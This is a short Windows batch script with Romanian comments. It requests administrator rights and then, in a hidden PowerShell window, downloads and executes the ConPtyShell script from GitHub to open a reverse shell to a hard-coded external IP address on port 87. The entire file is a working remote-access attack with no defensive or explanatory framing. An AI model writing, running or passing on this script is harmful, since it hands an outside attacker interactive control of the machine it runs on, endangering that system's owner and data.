@echo off
setlocal EnableDelayedExpansion

:: Verifică dacă are privilegii de administrator
>nul 2>&1 net session
if %errorlevel% neq 0 (
    echo [!] Scriptul nu are permisiuni de administrator. Se cere permisiunea...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

powershell -WindowStyle Hidden -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.46.236.240 87"